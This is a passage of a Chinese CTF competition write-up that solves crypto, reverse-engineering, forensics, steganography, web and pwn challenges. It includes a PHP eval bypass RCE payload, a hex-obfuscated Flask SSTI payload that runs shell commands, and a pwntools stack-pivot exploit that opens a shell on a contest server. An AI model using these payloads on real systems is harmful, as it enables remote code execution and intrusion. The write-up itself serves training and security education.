+<p><span style="font-size: 12pt">然后将key通过解密函数对flag进行解密，就可以得到flag了。</span></p>
+<pre><code>#!/usr/bin/python3
+from Crypto.Util.number import *
+def decrypt(key,flag):
+    block_len = len(flag) // len(key) + 1
+    new_key = key * block_len
+    return bytes([i^j for i,j in zip(flag,new_key)])
+
+key = [95, 17, 50, 255, 97]
+flag = [60, 112, 72, 134, 26, 38, 34, 109, 206, 18, 0, 112, 109, 151, 85, 49, 117, 65, 207, 12, 58, 78, 80, 207, 24, 126, 108]
+
+print(decrypt(key,flag))
+=&gt; b&#39;cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;&#39;
+</code></pre>
+<p><span style="font-size: 12pt">FLAG值：cazy{y3_1s_a_h4nds0me_b0y!}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目三combat_slogan</span></span></p>
+<p><span style="font-size: 12pt">题目附件如下：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/007e0a7ce728b17a1a83a8bc5b2203fe.png"></span></p>
+<p><span style="font-size: 12pt">一个jar文件</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">用Apktool Box 打开jar</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d1e3f8c7bbf0fb00c18eec07d408d4c4.png"></span></p>
+<p><span style="font-size: 12pt">看Main函数：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/a2a7c73ff92e10bf7327c6d0531122f5.png"></span></p>
+<p><span style="font-size: 12pt">大致是通过输入的字符串通过ttk类实现加减ascii码 然后要等于Jr_j11y_s1tug_g0_raq_g0_raq_pnml</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">用在线工具调试了一下程序 发现这玩意有点凯撒的感觉 然后仔细一数这不是rot13嘛。。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/050f31c4e152b7450229433c5b14aee2.png"></span></p>
+<p><span style="font-size: 12pt">直接把字符串在线rot13转换一下</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8ad8aaa1c88aebd7e1816151251fd0ae.png"></span></p>
+<p><span style="font-size: 12pt">包上cazy得到flag 提交正确。</span></p>
+<p><span style="font-size: 12pt">FLAG值：cazy{ We_w11l_f1ght_t0_end_t0_end_cazy }</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目四no_can_no_bb</span></span></p>
+<p><span style="font-size: 12pt">拿到题目，我们发现存在两个函数，一个 pad(m) 一个 encrypt(m, key)，我们主要需要分析的函数就是pad</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ce871a946d7feba7f137e31f0a292fba.png"></span></p>
+<p><span style="font-size: 12pt">分析pad 函数，我们发现他是将不足16位的文件补足，比16位大的文件补至32位，以此类推。</span></p>
+<p><span style="font-size: 12pt">而且可以看到key 的范围并不大，仅仅只有1 - 1&lt;&lt;20 (1048576)，所以这道题目最理想的解题方式就是爆破key，因为AES的ECB模式并不需要考虑iv（偏移量）。</span></p>
+<pre><code>#!/usr/bin/python3
+from Crypto.Util.number import *
+from Crypto.Cipher import AES
+def pad(m):
+    tmp = 16-(len(m)%16)
+    return m + bytes([tmp for _ in range(tmp)])
+
+for i in range(1,1&lt;&lt;20):
+    cipher = b&#39;\x9d\x18K\x84n\xb8b&#39;\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#39;
+    key = pad(long_to_bytes(i))
+    aes = AES.new(key,AES.MODE_ECB)
+    if aes.decrypt(cipher)[:5] == b&#39;cazy&#123;&#39;:
+        print(aes.decrypt(cipher))
+    else:
+        pass
+=&gt;b&#39;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#39;
+</code></pre>
+<p><span style="font-size: 12pt">FLAG值：cazy{n0_c4n,bb?n0p3!}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目五西安加油</span></span></p>
+<p><span style="font-size: 12pt">打开流量包</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/367a49bb906f47b14dcba0b380d9d354.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">追踪TCP流 发现一段base64</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/641fd27b60ff2af43052516f10442e28.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">Save提取至txt文本 然后再把无关字符去掉 最后得到：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/2bbe11d9f6a9e32c3fe8c478d23b9bf0.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">用python解密一下</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/4ec88875b2bc261e868693f59ea7c855.png"></span></p>
+<p><span style="font-size: 12pt"> </span></p>
+<p><span style="font-size: 12pt">得到一堆二进制文件 再写入文件</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f6a61d3d11f5ce3b6add229587bb4fd9.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">Winhex分析一下 发现是一个压缩包</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/74ecf6b030158d1e6773368f89a34c5e.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">改后缀。解压后得到了一堆图片，很明显是拼图题。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/02b7cd292b01c2ff3257b53dc6d244e8.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">因为没有装gaps所以只好ps手拼，为了好拼百度搜索查找一番后找到了原图：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/92bbcc9e061875e226c22a04d794e61a.png"></span></p>
+<p><span style="font-size: 12pt">拼了好久一段时间 最后总算是拼完了</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ab6f7bfd926b8663ba911e8aa60febe7.png"></span></p>
+<p><span style="font-size: 12pt">FLAG值：cazy{make_XiAn_great_Again}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">附gaps做法：</span></p>
+<p><span style="font-size: 12pt">先用montage将小图结合到大图里去</span></p>
+<p><span style="font-size: 12pt;font-family: unset">magick montage *.png -geometry +0+0 flag.jpg</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f1bc333565ab8a1a695041cba5912d4e.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt;font-family: unset">将得到的大图 用gaps自动拼接</span></p>
+<p><span style="font-size: 16px;letter-spacing: normal;text-indent: 0px;text-transform: none;, sans-serif, SimHei, SimSun">gaps –image&#x3D;flag.jpg –generations&#x3D;40 –population&#x3D;120 –size&#x3D;100 –save</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/640583a7ba2b69175c7a4d334f2a66af.png"></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e6c54e9aa48d0c8c877bd8c3a687e5de.png"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目六朴实无华的取证</span></span></p>
+<p><span style="font-size: 12pt">这是一道为数不多的内存取证题目，题目给了我们一个xp_sp3.raw内存文件。我们就用volatility对其进行分析。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/3e86f4a4295d7eb0a9b90212a8eea71b.png"></span></p>
+<p><span style="font-size: 12pt">查看系统基本信息之后，我们可以确定他的系统版本信息为WinXPSP2x86。根据内存取证的做题手法，对内存中正在运行的进程列出进行分析。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/67fd4d2d372677709d8d374ef327e4bb.png"></span></p>
+<p><span style="font-size: 12pt">我们发现内存中运行着notepad.exe。我们就用 notepad 插件对notepad中的内容进行提取。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/40872828e21bdab52ca00f636bdaf3ab.png"></span></p>
+<p><span style="font-size: 12pt">发现记事本中存在信息 20211209(encrypt)，之后我们对系统中可能存在的有关答案的文件进行列出并提取。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/647999130fa70121dbb9ded1f6478add.png"></span></p>
+<p><span style="font-size: 12pt">我们可以发现存在flag.zip flag.png。将文件提取出来之后，发现压缩包需要解压密码，那么我们将刚才从记事本中得到的密码对其进行解压。然后我们得到了一个类似于加密的记事本内容。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/c21596cfe19e30b5625bf41f46a961c3.png"></span></p>
+<p><span style="font-size: 12pt">然后得到了一张png图片，实际上是BMP图片。图片中告诉了我们一个大概的FLAG</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/150e6ca8c79320b2098a2bd0bb780880.png"></span></p>
+<p><span style="font-size: 12pt">然后根据加密脚本，对其进行解密，加密脚本的大致原理应该是一个凯撒加密。并且偏移量为3位。我们对其进行大概的解密后发现，FLAG并不是正确的。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/0162ecb7515346a72fc23c3e3569d4a0.png"></span></p>
+<p><span style="font-size: 12pt">我们知道，在凯撒加密中，特殊字符和数字并不能被正确的加密或者解密，所以根据加密脚本，我们将数字的ACSII码向后位移32位之后，并且根据做题习惯将？改为_，便可以得到正确的flag</span></p>
+<p><span style="font-size: 12pt">FLAG值：cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目七RCE_No_Para</span></span></p>
+<p><span style="font-size: 12pt">这道题，就是一道需要通过PHP各种参数进行Bypass绕过的题目。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/67d78e10e7407b026028c22f1ac7eb7e.png"></span></p>
+<p><span style="font-size: 12pt">分析题目之后，发现题目通过正则表达式，将匹配到的文件替换为空，并且对 session</span></p>
+<p><span style="font-size: 12pt">end next header dir 字样进行检测，如果检测到了便返回 “Hacker!”</span></p>
+<p><span style="font-size: 12pt">既然会对code中函数进行检测，那么我们就用别的参数进行传参，并且对code进行注释。</span></p>
+<p><span style="font-size: 12pt">构造Payload来获取目录下的文件:</span></p>
+<p><span style="font-size: 12pt">?1551&#x3D;system(%27cat%20flag.php%27);&#x2F;&#x2F;&amp;code&#x3D;eval(implode(reset(get_defined_vars())));</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/1e9ca09f96d9a6225c7664c5c1905d3e.png"></span></p>
+<p><span style="font-size: 12pt">构造Payload来获得flag：</span></p>
+<p><span style="font-size: 12pt">?1551&#x3D;system(%27cat%20flag.php%27);&#x2F;&#x2F;&amp;code&#x3D;eval(implode(reset(get_defined_vars())));</span></p>
+<p><span style="font-size: 12pt">在F12中得到flag值。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8ca1178d16305918fd8dfff23bc8c6de.png"></span></p>
+<p><span style="font-size: 12pt">FLAG值：flag{94e3bd90859dba7c2cb9f47865947370}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目八flask</span></span></p>
+<p><span style="font-size: 12pt">进入题目，我们打开F12打开发现前端存在判断，仔细观察函数requests已经if语句格式，结合题目 flask，我们推断出来这是一道SSTI注入题目。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/830a55042e409db0ac9fb73c14ed4f59.png"></span></p>
+<p><span style="font-size: 12pt">然后题目要求url的结尾必须以.js结尾。所以我们可以构造一个注入语句来判读框架。</span></p>
+<p><span style="font-size: 12pt">&#x2F;admin?name&#x3D;49&amp;a&#x3D;.js?</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/842121dcff69a9191fa9fdbb752585aa.png"></span></p>
+<p><span style="font-size: 12pt">果然，不出所料，这道题目属于 Flask SSTI 模板注入，在对网页后端的WAF进行爆破后，我们发现我们常用的__globlas__，__init__，等寻常的函数都被WAF了。</span></p>
+<p><span style="font-size: 12pt">但是我们可以用另一种方法，那就是利用python内置的attr函数啦进行十六进制转字符串并且执行函数，用()来代替[]，用attr来实现函数功能。</span></p>
+<p><span style="font-size: 12pt">Payload:</span></p>
+<p><span style="font-size: 12pt">admin?name&#x3D;<code>&#123;&#123;(test'attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")'attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")'attr("\x67\x65\x74")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")'attr("\x67\x65\x74")("\x65\x76\x61\x6c")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x22\x29\x2e\x72\x65\x61\x64\x28\x29"))&#125;&#125;</code>&amp;a&#x3D;.js?</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f6ba48331044c5b78c21aa29f36c4f77.png"></span></p>
+<p><span style="font-size: 12pt">然后就可以得到flag。</span></p>
+<p><span style="font-size: 12pt">FLAG值：flag{81ede5b11793556e2f311b010ed3b34b}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目九cute_doge</span></span></p>
+<p><span style="font-size: 12pt">作为一个逆向狗，无论什么exe都想点一点。看到题目，我们打开之后，并没有特别的提示，只有一只 cute_doge</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/0a25db44ee0936ca0f0795535ff8e30b.png"></span></p>
+<p><span style="font-size: 12pt">并且在点击图片（按钮）之后会提示”我说flag在这里，你信吗？”字样。于是我们按照惯例，对软件进行分析。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/5f4cda3935c6d23dba59e339ea9a1f30.png"></span></p>
+<p><span style="font-size: 12pt">在确定是64位系统软件之后，我们就可以使用IDA来对软件进行静态分析。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8661391b8928b1e9fa4841ce2618a194.png"></span></p>
+<p><span style="font-size: 12pt">在对软件内的字符串进行从上到下的分析时，我们发现有一串类似于base64加密的字符串，别问，问就是杂项手的第六感。</span></p>
+<p><span style="font-size: 12pt">果不其然，在解密后我们得到flag</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/7fd7d939785c59a979f5a785d2c85d79.png"></span></p>
+<p><span style="font-size: 12pt">FLAG值：flag{Ch1na_yyds_cazy}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十无字天书</span></span></p>
+<p><span style="font-size: 12pt">这道题目属实有一点偏门，但是身为一个杂项人，搜索能力当然是最重要的。</span></p>
+<p><span style="font-size: 12pt">题目给了我们一个 key.ws 和一个 flag.txt，其中的内容都是有空格 连接符 - 和 Tab号组成的密文，观察 flag.txt ，发现明显是由 snow 加密过后的 flag</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/cc10d9e3874ca1c91f3793263b0e374a.png"></span></p>
+<p><span style="font-size: 12pt">但是解密 snow 需要密钥，那么我们在看到 key.ws 只有空格和连接号和Tab组成并且没有明显的分隔符，那么经过一番搜索，最后确定了是 white-space 隐写。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/164c8e881900b0babe60fa0770d9b833.png"></span></p>
+<p><span style="font-size: 12pt">我们成功拿到Key之后，就可以用Snow 解密工具对flag进行解密了。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ecde1ebcf8b25784e7f661d4e89bfd64.png"></span></p>
+<p><span style="font-size: 12pt">FLAG值：cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十一 binary</span></span></p>
+<p><span style="font-size: 12pt">这道题目给了我们一个234文件，在我们不清楚文件类型的情况下，我们可以使用Winhex来分析文件的文件头，从而确定文件的文件类型。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f9841613d266c80e04e81595d561e074.png"></span></p>
+<p><span style="font-size: 12pt">通过分析文件头 CAFEBABE 我们可以知道这是一个 java 的 .class 文件，知道文件类型之后，我们就可以对文件进行反编译了。我的做法是直接扔到 IDEA 里面进行反编译。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/5b859d438d5391c3dadbf22fefb1bdb8.png"></span></p>
+<p><span style="font-size: 12pt">分析文件后，我们发现主函数 Main 下有一个数组，且里面的字符很像我们日常使用的ACSII编码。我们将字符进行提取并且解码。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e2f17bdf46a84a9e7a82ac0be1a29f1b.png"></span></p>
+<p><span style="font-size: 12pt">得到文件后，熟悉Base64的CTFer就知道是0和1的编码了。放到在线网站base64.us种解密后得到我们所需要的数据。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d6d981dd43ba4bcdd55cb84be9521841.png"></span></p>
+<p><span style="font-size: 12pt">解码后，我们发现这是由一个一组由37个数据并且分37组所组成的二进制，当我们将二进制分行显示时，便发现二进制的排序从某种角度来说很像二进制。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f8357e39f1747ed98a932706d2b4c50a.png"></span></p>
+<p><span style="font-size: 12pt">为了验证我们的猜想，我们将1替换为白色方格，将0替换为黑色方格。然后显示字符串。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/6251860405b1f6eef69d5eb0fd3243c8.png"></span></p>
+<p><span style="font-size: 12pt">所幸，我们的猜想是正确的，通过扫描二维码我们也是成功的获取到了flag。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/36e3ec34fd4b9fd1354a7b3c2c316e3e.png"></span></p>
+<p><span style="font-size: 12pt">FLAG值：flag{932b2c0070e4897ea7df0190dbf36ece}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十二 hello_py</span></span></p>
+<p><span style="font-size: 12pt">这道题目，我们直接利用在线的pyc转py的网站，将题目所给的pyc文件转为可读的py文件。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d8b79a99a870700c13ed3fb197b2d547.png"></span></p>
+<p><span style="font-size: 12pt">根据python文件所给的整体逻辑，我们分析题目需要我们输入一个flag，然后进行加密，对已经加密过的Happy数列进行比较。</span></p>
+<p><span style="font-size: 12pt">然后我们发现存在两个加密函数 encode_1 和 encode_2 ，但是他们并不是一起工作的，而是有线程 t1 先启动，然后线程 t2 再启动。组成一个双加密。</span></p>
+<p><span style="font-size: 12pt">分析 encode_1 函数，是将 flag 于 奇数位进行异或加密， encode_2 函数则是于 偶数位进行异或加密。注意他们的加密方式虽然相同但是加密的偏移量不同。</span></p>
+<p><span style="font-size: 12pt">然后我们就可以逆向推导出解密过程。</span></p>
+<pre><code>(chr(112 ^ 9) + chr(10 ^ 112) + chr(102 ^ 7) + chr(5 ^ 102) + chr(90 ^ 5) + chr(106 ^ 90) + chr(50 ^ 3) + chr(3 ^ 50) + chr(100 ^ 1) + chr(44 ^ 100))[::-1]
+=&gt;&#39;He110_cazy&#39;
+</code></pre>
+<p><span style="font-size: 12pt">FLAG值: He110_cazy</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十三 Ez_Steg</span></span></p>
+<p><span style="font-size: 12pt">题目附件如下：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/6f2f68a0c9db654995cf427f726539a9.png"></span></p>
+<p><span style="font-size: 12pt">压缩包提示说密码是6位数字</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">直接用bandizip自带的密码破解 很快啊，只要一秒啊</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/9988674343f624fb3fdf3aa522106fbd.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">得到密码为220101</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">解压成功后 得到emjio.txt 和一个pyc文件</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">先看emoji密码</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/e02ac7c0765c7784de182e88c0e38c83.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">先试了试base100 无果，题目还给了一个pyc 需要密钥的emoji加密 猜想到了emoji-aes加密</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">再看pyc文件 我第一时间是将其反编译uncompyle6 -o key.py steg.pyc</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">Python文件如下：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8fc5f238ff31b8a0ba35d6dac93a811a.png"></span></p>
+<p><span style="font-size: 12pt">这里我卡了很久 这程序跟我们要的密钥也没关系呀。。所以我这边就放了放 后面突然想起来了pyc也能作为一种隐写。</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">这里是剑龙隐写Stegosaurus 脚本github可下</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">Python stegosaurus.py -x steg.pyc</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/55849d2b4b0bcf4e6b83e44b584f0a53.png"></span></p>
+<p><span style="font-size: 12pt">得到了key St3g1sV3ryFuNny</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">最后用emoji-aes解码 一把梭！ <a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/860c2949a1231e695806d4f3ad7064fd.png"></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/043bb194a2d11c928007f4e35de6dc72.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">FLAG值: cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十四 no_math_no_cry</span></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">这道题目比较小，所以我们直接来看 sec_encry(m) 这个函数。c 是该函数加密flag后得到的值</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/680e543368777f60de4aabca224c4ec7.png"></span></p>
+<p><span style="font-size: 12pt">根据他的加密过程，我们可以反向推导解密脚本，但是我们在编写脚本的时候要注意，因为他限制了flag的长度不能超过80，那么经过bytes_to_long变成数字的flag 再减去 1&lt;&lt;500(3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127560071009217256545885393053328527589376)之后，很有可能是负数。而负数的平方又是正数。以下是解密脚本</span></p>
+<pre><code>#!/usr/bin/python3
+from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes as l2b
+c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169
+c1 = c - 0x0338470
+c2 = iroot(c1,2)[0]
+c3 = -c2 + (1&lt;&lt;500)
+print(l2b(c3))
+=&gt;b&#39;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#39;
+</code></pre>
+<p><span style="font-size: 12pt">FLAG值:cazy{1234567890_no_m4th_n0_cRy}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十五 pwn1</span></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8e02a4f8cf367f22b54e038dd6f2b642.png"></span></p>
+<p><span style="font-size: 12pt">32位程序 IDA分析：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/64508def49525b4a2ec64f5b77e32e08.png"></span></p>
+<p><span style="font-size: 12pt">显然的栈溢出 shift+f12 看字符串 发现还给了后门：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/051ca26752a1c909dae8af94b1c1d4d9.png"></span></p>
+<p><span style="font-size: 12pt">这道本让我以为很简单的题目我却做了很久 栈溢出 后门，没想到不是那么简单</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">（原本的payload）</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/27c918385f7f686feb43484ebb711d71.png"></span></p>
+<p><span style="font-size: 12pt">结果没打通</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/1bdf017a6c4d6dfd731932c1bb069672.png"></span></p>
+<p><span style="font-size: 12pt">后来搞了很久 想了一下题目还给了buf的地址 再看汇编</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d1096f7b385d545c202793da1b3ab415.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">那么是不是可以把&#x2F;bin&#x2F;sh写进buf的地址 然后把地址覆盖 最后拿到shell</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">实际上我们要找到binsh的地址 然后再填充一些垃圾字符 最后再将buf的地址覆盖 因为最后lea那里减去了4 所以最后还要补一个+4</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">其实不是栈溢出 而是栈迁移。</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">先用接受buf的地址</span></p>
+<pre><code>r.recvuntil(&#39;Gift:&#39;)
+bufaddr = eval(r.recv().strip())
+</code></pre>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/86c95cabef33c02886335337d034d9a7.png"></span></p>
+<p><span style="font-size: 12pt">这里找到后门地址为0x8048540</span></p>
+<p><span style="font-size: 12pt">所以最终payload是</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<pre><code>payload = p32(binsh_addr) + b&#39;a&#39;*48 + p32(bufaddr+4)
+</code></pre>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/4d13f597302f03fc6d0601321dcd189e.png"></span></p>
+<p><span style="font-size: 12pt">打通：</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/96b58404f4de909b040ef757afc1beb1.png"></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<pre><code>from pwn import *
+
+context.log_level=&#39;debug&#39;
+r = remote(&#39;113.201.14.253&#39;,16088)
+r.recvuntil(&#39;Gift:&#39;)
+bufaddr = eval(r.recv().strip())
+print(&#39;[+]%s&#39;%hex(bufaddr))
+binsh_addr = 0x08048540
+payload = p32(binsh_addr) + b&#39;a&#39;*48 + p32(bufaddr+4)
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">FLAG值：flag{474b7f9219effe69530da4ad63c1752a}</span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目十六LinearEquations</span></span></p>
+<p><span style="font-size: 12pt"></span></p>
+<p><span style="font-size: 12pt">拿到题目之后。通过观察题目。我们可以发现题目主要分为3大块，第一块就是开头的限制函数 assert，通过这里我们可以得到很多信息。比如flag的长度为24位。</span></p>
+<p><span style="font-size: 12pt">第二块就是主要的加密块了，我们可以发现通过 <strong>init</strong>() 来初始化 class类，并且传递了两个值，就是 seed1 和 seed2，并且将flag 分为了3份，由 flag[:8] flag[8:16] flag[16:]组成，每一部分8个字符。并且8个字符转为数字后不能比n大。</span></p>
+<p><span style="font-size: 12pt">第三块就是我们的主进程了。进程通过getRandomInteger(64)来向函数中传递了两个seed的值。并且返回了由 my_LCG().next()中产生的5个seed。</span></p>
+<p><span style="font-size: 12pt"><img src="/uploads/2022/01/98d8a09a5f6bef6a4b0d2f12d00e5069.png"></span></p>
+<p><span style="font-size: 12pt">由函数推理得知，seed3是由 seed1 和 seed2 推导产生。</span></p>
+<p><span style="font-size: 12pt">具体的方程为 (flag1 * seed2 + flag2 * seed1 + flag3) % n</span></p>
+<p><span style="font-size: 12pt">由此，我们可以推导出三条方程，结合题目的意思，就是线性方程组。</span></p>
+<pre><code>flag1 * seed4 + flag2 * seed3 + flag3 mode n = seed5
+flag1 * seed5 + flag2 * seed4 + flag3 mode n = seed6
+flag1 * seed6 + flag2 * seed5 + flag3 mode n = seed7
+</code></pre>
+<p><span style="font-size: 12pt">由此我们可以联立线性方程组，最后推出答案。</span></p>
+<pre><code>flag1 = 5490290802446982981
+flag2 = 8175498372211240502
+flag3 = 6859390560180138873
+</code></pre>
+<p><span style="font-size: 12pt">最后将flag转为字符串即可</span></p>
